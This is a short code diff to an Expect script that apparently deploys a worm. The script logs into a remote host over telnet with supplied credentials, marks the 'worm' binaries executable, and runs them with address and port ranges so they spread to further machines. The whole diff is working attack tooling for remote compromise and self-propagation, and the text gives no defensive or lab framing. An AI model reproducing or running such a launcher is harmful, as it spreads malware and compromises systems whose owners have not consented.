@@ -4,11 +4,13 @@ set ip [lindex $argv 0]
 set port [lindex $argv 1]
 set username [lindex $argv 2]
 set password [lindex $argv 3]
+set addrrange [lindex $argv 4]
+set portrange [lindex $argv 5]
 spawn telnet $ip $port -l $username
 expect "password:"
 send "$password\r"
 expect "$"
-send "./worm ; ./worm.i686\r"
+send "chmod +x worm* ; ./worm $addrrange $portrange ; ./worm.i686 $addrrange $portrange\r"
 expect "$"
 sleep 2
 send "exit\r"
